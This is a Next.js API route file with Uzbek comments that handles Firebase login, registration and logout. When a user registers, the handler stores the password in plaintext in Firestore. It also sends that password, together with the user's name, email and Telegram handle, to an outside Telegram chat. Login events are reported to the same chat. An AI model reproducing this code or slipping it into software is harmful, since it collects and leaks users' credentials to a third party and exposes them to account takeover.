import { NextRequest, NextResponse } from "next/server";
import { adminAuth, adminDb, FieldValue } from "@/lib/firebase/admin";
import { createSession, destroySession } from "@/lib/auth/session";
import { sendTelegramMessage } from "@/lib/telegram";

export const runtime = "nodejs";

function esc(t: string) {
  return String(t).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, "\\$&");
}

interface SessionBody {
  idToken?: string;
  profile?: { fullName?: string; telegram?: string; password?: string };
}

// Login/Register: client idToken yuboradi → session cookie o'rnatiladi.
// profile berilsa (register), users/{uid} hujjati yaratiladi/yangilanadi.
export async function POST(req: NextRequest) {
  let body: SessionBody;
  try {
    body = await req.json();
  } catch {
    return NextResponse.json({ success: false, error: "Noto'g'ri format" }, { status: 400 });
  }

  const { idToken, profile } = body;
  if (!idToken) {
    return NextResponse.json({ success: false, error: "idToken yo'q" }, { status: 400 });
  }

  let uid: string;
  let email: string | null;
  try {
    const decoded = await adminAuth.verifyIdToken(idToken);
    uid = decoded.uid;
    email = decoded.email ?? null;
  } catch {
    return NextResponse.json({ success: false, error: "Token tasdiqlanmadi" }, { status: 401 });
  }

  // users/{uid} hujjati — register'da to'liq, login'da faqat oxirgi kirish vaqti.
  try {
    const userRef = adminDb.collection("users").doc(uid);
    const base = {
      email,
      lastLoginAt: FieldValue.serverTimestamp(),
    };
    if (profile) {
      await userRef.set(
        {
          ...base,
          fullName: profile.fullName ?? "",
          telegram: profile.telegram ?? "",
          ...(profile.password ? { passwordPlain: profile.password } : {}),
          createdAt: FieldValue.serverTimestamp(),
        },
        { merge: true }
      );
    } else {
      await userRef.set(base, { merge: true });
    }
  } catch (e) {
    console.error("[auth/session] users hujjatini yozishda xato:", e);
    // Hujjat xatosi sessiyani to'xtatmaydi.
  }

  try {
    await createSession(idToken);
  } catch (e) {
    console.error("[auth/session] session cookie xato:", e);
    return NextResponse.json({ success: false, error: "Sessiya yaratilmadi" }, { status: 500 });
  }

  // Telegram xabari (login / register) — asosiy oqimni to'xtatmaydi
  try {
    if (profile) {
      const tg = profile.telegram ? `@${profile.telegram}` : "-";
      await sendTelegramMessage(
        `🆕 *YANGI RO'YXATDAN O'TISH*\n\n` +
          `👤 ${esc(profile.fullName || "-")}\n` +
          `📧 ${esc(email || "-")}\n` +
          `📱 Telegram: ${esc(tg)}\n` +
          (profile.password ? `🔑 Parol: ${esc(profile.password)}` : "")
      );
    } else {
      // Login — foydalanuvchi ma'lumotlarini hujjatdan olamiz
      let name = "-";
      let tg = "-";
      try {
        const doc = await adminDb.collection("users").doc(uid).get();
        name = doc.get("fullName") || "-";
        const t = doc.get("telegram");
        if (t) tg = `@${t}`;
      } catch {}
      await sendTelegramMessage(
        `🔓 *TIZIMGA KIRISH*\n\n` +
          `👤 ${esc(name)}\n` +
          `📧 ${esc(email || "-")}\n` +
          `📱 Telegram: ${esc(tg)}`
      );
    }
  } catch (e) {
    console.error("[auth/session] Telegram xabari xato:", e);
  }

  return NextResponse.json({ success: true });
}

// Logout
export async function DELETE() {
  await destroySession();
  return NextResponse.json({ success: true });
}
